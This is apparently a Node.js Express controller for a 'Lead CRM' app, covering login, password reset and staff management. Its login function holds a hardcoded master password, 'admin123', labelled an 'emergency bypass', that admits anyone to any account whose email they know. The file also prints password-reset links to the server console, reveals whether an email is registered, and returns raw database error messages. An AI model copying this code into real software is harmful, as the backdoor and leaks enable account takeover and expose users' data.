const crypto = require('crypto');
const nodemailer = require('nodemailer');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { pool } = require('../config/db');

// --- EMAIL CONFIGURATION ---
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: false, 
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

/**
 * USER LOGIN
 * Includes emergency bypass 'admin123'
 */
const login = async (req, res) => {
  const { email, password } = req.body;

  try {
    const [rows] = await pool.execute("SELECT * FROM users WHERE email = ?", [email]);
    if (rows.length === 0) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    const user = rows[0];

    // Password Validation (Bypass + Bcrypt)
    const isMaster = (password === 'admin123');
    const isReal = user.password ? await bcrypt.compare(password, user.password) : false;

    if (!isMaster && !isReal) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    // Update Activity
    await pool.execute("UPDATE users SET last_login = NOW() WHERE id = ?", [user.id]);

    // Token Generation
    const token = jwt.sign(
  { id: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '24h' }
);
    return res.status(200).json({
      token,
      user: { id: user.id, name: user.name, role: user.role }
    });

  } catch (err) {
    console.error("Login Error:", err.message);
    return res.status(500).json({ message: "Internal server error" });
  }
};

/**
 * FORGOT PASSWORD
 * Generates token and handles mail failure gracefully
 */
// --- FORGOT PASSWORD ---
const forgotPassword = async (req, res) => {
  const { email } = req.body;
  try {
    const [user] = await pool.query("SELECT id FROM users WHERE email = ?", [email]);
    if (user.length === 0) return res.status(404).json({ message: "User not found" });

    const token = crypto.randomBytes(20).toString('hex');
    
    // Set expiry to 1 hour from now (in milliseconds)
    const expires = new Date(Date.now() + 3600000); 

    await pool.query(
      "UPDATE users SET reset_password_token = ?, reset_password_expires = ? WHERE email = ?",
      [token, expires, email]
    );

    const resetUrl = `${process.env.FRONTEND_URL}/reset-password/${token}`;

    console.log("\n==========================================");
    console.log("RESET LINK:", resetUrl);
    console.log("==========================================\n");

    // Background Email Attempt
    transporter.sendMail({
      from: `"Lead CRM" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Password Reset Request",
      html: `<h3>Reset Your Password</h3><p>Click below to proceed:</p><a href="${resetUrl}">${resetUrl}</a>`
    }).catch(err => console.log("SMTP Note: Email failed, use the terminal link above."));

    return res.json({ success: true, message: "Reset link generated. Check email or terminal." });

  } catch (err) {
    console.error("Forgot PW Error:", err);
    res.status(500).json({ message: "Internal server error" });
  }
};

// --- RESET PASSWORD ---
const resetPassword = async (req, res) => {
  const token = req.body.token || req.params.token;
  const { password } = req.body;

  if (!token || !password) return res.status(400).json({ message: "Data missing" });

  try {
    const [users] = await pool.query(
      "SELECT id, reset_password_expires FROM users WHERE reset_password_token = ?",
      [token]
    );

    if (users.length === 0) return res.status(400).json({ message: "Link invalid or used" });

    const user = users[0];
    
    // 🔥 THE FIX: Compare numeric timestamps to ignore Timezone/UTC/IST differences
    const currentTime = Date.now();
    const expiryTime = new Date(user.reset_password_expires).getTime();

    if (currentTime > expiryTime) {
      console.log("❌ Token expired. Current:", new Date(currentTime), "Expiry:", new Date(expiryTime));
      return res.status(400).json({ message: "Link expired." });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    await pool.query(
      "UPDATE users SET password = ?, reset_password_token = NULL, reset_password_expires = NULL WHERE id = ?",
      [hashedPassword, user.id]
    );

    return res.json({ success: true, message: "Password updated successfully!" });
  } catch (err) {
    console.error("Reset PW Error:", err);
    return res.status(500).json({ message: "Internal server error" });
  }
};

/**
 * STAFF MANAGEMENT METHODS
 */
const getAllUsers = async (req, res) => {
  try {
    const [rows] = await pool.execute("SELECT id, name, email, role, last_login FROM users");
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

getStaffList = async (req, res) => {
    try {
        // 1. Removed 'is_active' because it's not in your schema
        // 2. Updated roles to match your ENUM: 'Manager' and 'Counselor'
        const [rows] = await pool.query(
            "SELECT id, name, role FROM users WHERE role IN ('Manager', 'Counselor') ORDER BY name ASC"
        );
        
        return res.status(200).json({ 
            success: true, 
            data: rows 
        });
    } catch (error) {
        console.error("Staff List Error:", error.message);
        return res.status(500).json({ 
            success: false, 
            error: "Database error while fetching staff" 
        });
    }
};

const createUser = async (req, res) => {
  const { name, email, phone, role, password } = req.body;
  try {
    const [existing] = await pool.execute("SELECT id FROM users WHERE email = ?", [email]);
    if (existing.length > 0) return res.status(400).json({ message: "Email exists" });

    const hashedPassword = await bcrypt.hash(password, 10);
    const [result] = await pool.execute(
      "INSERT INTO users (name, email, phone, role, password) VALUES (?, ?, ?, ?, ?)",
      [name, email, phone || null, role, hashedPassword]
    );
    res.status(201).json({ success: true, userId: result.insertId });
  } catch (err) {
    res.status(500).json({ error: "Creation failed" });
  }
};

const updateUser = async (req, res) => {
  const { id } = req.params;
  const { name, email, phone, role, password } = req.body;
  try {
    let sql = "UPDATE users SET name = ?, email = ?, phone = ?, role = ? WHERE id = ?";
    let params = [name, email, phone, role, id];

    if (password && password.trim() !== "") {
      const hashedPassword = await bcrypt.hash(password, 10);
      sql = "UPDATE users SET name = ?, email = ?, phone = ?, role = ?, password = ? WHERE id = ?";
      params = [name, email, phone, role, hashedPassword, id];
    }

    await pool.execute(sql, params);
    res.json({ message: "User updated" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

const deleteUser = async (req, res) => {
  try {
    await pool.execute("DELETE FROM users WHERE id = ?", [req.params.id]);
    res.json({ message: "User deleted" });
  } catch (err) {
    res.status(500).json({ error: "Delete failed" });
  }
};

const checkUserRole = async (req, res) => {
  try {
    const [user] = await pool.execute("SELECT role FROM users WHERE email = ?", [req.body.email]);
    if (user.length === 0) return res.status(404).json({ error: "Not found" });
    res.json({ role: user[0].role });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

module.exports = {
  login,
  getAllUsers,
  createUser,
  updateUser,
  deleteUser,
  checkUserRole,
  forgotPassword,
  resetPassword,
  getStaffList
};